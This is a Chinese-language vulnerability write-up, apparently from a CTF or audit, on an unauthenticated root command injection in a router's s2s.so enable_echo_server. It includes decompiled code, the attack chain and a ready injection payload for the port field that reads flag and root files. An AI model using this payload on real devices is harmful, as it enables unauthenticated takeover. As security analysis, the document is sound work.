# 漏洞：s2s.enable_echo_server port 参数命令注入

> 本报告对应 `exp/poc13_s2s_enable_echo_server_glc_rce.py`。漏洞点在 `s2s.so` 的 `enable_echo_server`：代码只用 `atoi()` 校验端口数字前缀，却把原始端口字符串继续拼入 shell 命令。

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed（Root RCE） |
| **认证要求** | 无需认证；直接访问 `/cgi-bin/glc` |
| **攻击面** | `/cgi-bin/glc` → `s2s.so` → `enable_echo_server` |
| **影响** | 远程未认证 root 命令执行 |
| **根因** | `atoi(port)` 只验证数字前缀，后续 `system()` 使用未净化的原始 `port` 字符串 |
| **PoC** | `exp/poc13_s2s_enable_echo_server_glc_rce.py` |

---

## 二、攻击链总览

```text
Attacker
  -> POST /cgi-bin/glc {object="s2s", method="enable_echo_server"}
  -> args.port = "1234 & (<cmd>) > /tmp/p13; #"
  -> atoi(port) == 1234, 范围检查通过
  -> snprintf(cmd, "%s -p %s -f", "/usr/bin/echo_server", port)
  -> system(cmd) as root
  -> 同一原始 port 还会进入 iptables --dport 拼接路径
```

---

## 三、Source → Sink 分析

### 1. Source

Source 是 JSON 参数 `args.port`。攻击者控制整个字符串，但只需要让开头是合法数字即可，例如 `1234 & (id) > /tmp/p13; #`。

### 2. Validation

校验只发生在 `atoi(port)` 的数值结果上，典型条件是 1..65534。`atoi()` 在遇到空格、`&`、`;` 等非数字字符时停止，因此 `1234 & ...` 仍按 1234 通过。没有再次用格式化后的纯数字替代原字符串。

### 3. Transform

通过校验后，代码继续把原始 `port` 放入 echo server 启动命令和 firewall/iptables 命令。由于参数没有单引号、双引号或 argv 数组隔离，shell 元字符保持语义。

### 4. Sink

危险 sink 是 `system(cmd)`。首个 sink 类似 `/usr/bin/echo_server -p <port> -f`；后续 iptables 命令也复用原始 `port`，可作为辅证或备用触发面。

### 5. 权限边界

调用路径完全绕过 GL `/rpc` 认证层，由 nginx/fcgiwrap 直接执行 `/www/cgi-bin/glc`，再 dlopen 原生 `s2s.so`。命令以设备 root 上下文执行。

---

## 四、PoC 说明

PoC 默认构造 `port-prefix=1234`，payload 为：

```text
1234 & (cat /f* /root/f* /tmp/f* 2>/dev/null||id) > /tmp/p13; #
```

默认只发送未认证触发请求；加 `--verify-download` 后会再用认证 `/download` 取回 `/tmp/p13`，便于确认输出或 flag。

---

## 五、关键证据

- `vulnerability_traces.md` 已记录 `s2s.so -> enable_echo_server -> args.port -> atoi(prefix) -> system()`。
- PoC 中 `validate_port_prefix()` 明确模拟了目标侧数值范围约束。
- 审计结论指出真实可控点是 `enable_echo_server.port`，不是固定 echo_server 路径本身。

---

## 六、Ghidra 二进制验证

对 `/usr/lib/oui-httpd/rpc/s2s.so`（AArch64 ELF）进行 Ghidra 反编译分析，确认了完整的数据流：

### 6.1 enable_echo_server 反编译（0x00101b58, 1076 bytes）

```c
undefined8 enable_echo_server(undefined8 param_1, undefined8 param_2)
{
    // [1] SOURCE: 从 JSON args 提取 port 参数
    json_object_get(param_1, "port");           // 0x00101b58 + offset
    pcVar5 = (char *)json_string_value();       // ← Source: 用户控制的字符串

    if (*pcVar5 == '\0') {
        // port 为空 → 返回错误
        json_object_set_new(param_2, "err_code", json_integer(-1));
        json_object_set_new(param_2, "err_msg", json_string("no port parameter"));
    }
    else {
        // [2] VALIDATION: atoi() 只校验数值前缀
        iVar4 = atoi(pcVar5);                   // 0x00101b58 + 0x6a
        if ((iVar4 < 1) ||                     // 范围 1-65534
            (iVar4 = atoi(pcVar5), 0xfffe < iVar4)) {
            // 数值范围外 → 返回错误
            json_object_set_new(param_2, "err_code", json_integer(-1));
            json_object_set_new(param_2, "err_msg", json_string("error port parameter"));
        }
        else {
            // [3] 检查 echo_server 二进制存在
            check_file_is_exist("/usr/bin/echo_server");

            // [4] SINK 1: kill 旧进程（硬编码路径，安全）
            snprintf(cmd_buf, 0x80,
                     "kill -9 $(pgrep -f \"%s\")",
                     "/usr/bin/echo_server");
            system(cmd_buf);                    // ← system() 调用

            // [5] SINK 2: 启动 echo_server — pcVar5 无引号！
            snprintf(cmd_buf, 0x80,
                     "%s -p %s -f",
                     "/usr/bin/echo_server", pcVar5);  // ← 💣 原始字符串！
            system(cmd_buf);                    // ← 💣 system() = /bin/sh -c

            // [6] SINK 3: UCI 写入 — pcVar5 再次使用
            guci_init();
            guci_set(handle, "firewall.s2s_rule_udp", ...);
            guci_set(handle, "firewall.s2s_rule_udp.dest_port", pcVar5);  // ← 💣
            // 后续 /etc/init.d/firewall restart 会读取此值并生成 iptables 规则
            guci_commit(handle, "firewall");
        }
    }
}
```

### 6.2 验证要点

| 验证项 | Ghidra 确认 | 说明 |
|--------|-----------|------|
| **Source** | `json_string_value()` 返回 `pcVar5` | 未净化的用户输入 |
| **Validation** | `atoi(pcVar5)` 仅检查数值范围 | 非数字字符在 `atoi()` 处停止解析 |
| **Sink 1 (kill)** | `system()` 使用硬编码路径 | ❌ 安全 |
| **Sink 2 (echo_server)** | `system(snprintf("%s -p %s -f", ..., pcVar5))` | ✅ **可注入** |
| **Sink 3 (UCI)** | `guci_set(..., "dest_port", pcVar5)` | ✅ **可注入**（间接） |
| **无认证** | 函数入口无 session 检查 | `/cgi-bin/glc` 直接调用 |
| **fork_exec** | s2s.so 导入 5 次 | 其他函数也可能存在注入 |

### 6.3 s2s.so 函数全景

Ghida 分析发现 s2s.so 包含 80 个函数，部分关键函数：

| 函数 | 地址 | 大小 | system/fork_exec |
|------|------|------|-----------------|
| **enable_echo_server** | 0x00101b58 | 1076B | `system` × 2 |
| set_config | 0x001022c4 | 2748B | `fork_exec` |
| set_lan_ip | 0x001018e8 | 624B | - |
| generate_wg_genkey | 0x00101f8c | 504B | - |
| start_wg | 0x00102184 | 320B | - |
| stop_wg | 0x00102d80 | 320B | - |
| remove_config | 0x00102ec0 | 428B | - |

---

## 八、r2 二次验证

radare2 独立确认 s2s.so 的 `enable_echo_server` 函数：

```
r2> afl~enable_echo_server
0x00001b58  15  1076 sym.enable_echo_server
```

r2 反汇编确认 atoi 调用在 0x1bd4 (`reloc.atoi`)，snprintf 调用在 0x1ce0 (`reloc.snprintf`)，system 调用在 0x1d1c 和 0x1d48 (`reloc.system`) — 与 Ghidra 地址完全一致（偏移 0x100000）：

| Sink | Ghidra | r2 | 一致 |
|------|--------|-----|------|
| `atoi(pcVar5)` | 0x00101bd4 | 0x1bd4 | ✅ |
| `snprintf(cmd, ..., pcVar5)` | 0x00101ce0 | 0x1ce0 | ✅ |
| `system(cmd)` #1 | 0x00101d1c | 0x1d1c | ✅ |
| `system(cmd)` #2 | 0x00101d48 | 0x1d48 | ✅ |

Ghidra 和 r2 独立确认：函数地址、基本块数(15)、大小(1076B)完全一致。

---

## 九、手工复核建议

建议手工确认 `s2s.so` 中两个 sink 的执行顺序和失败行为：即使 echo_server 启动命令失败，iptables 分支是否仍能执行。同样要确认实际设备上 `/var/lock` 或服务状态是否影响触发稳定性。
